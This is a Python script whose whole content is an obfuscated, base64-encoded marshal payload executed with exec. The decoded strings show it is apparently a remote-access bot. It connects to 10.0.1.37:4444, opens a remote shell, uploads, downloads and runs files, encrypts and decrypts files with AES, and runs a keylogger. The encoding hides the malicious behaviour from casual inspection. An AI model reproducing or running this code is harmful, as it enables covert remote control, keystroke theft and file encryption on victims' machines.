import marshal, base64

def run_encrypted():
    data = base64.b64decode('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')
    code = marshal.loads(data)
    exec(code, globals())  # Use globals so imports like argparse work properly

if __name__ == '__main__':
    run_encrypted()
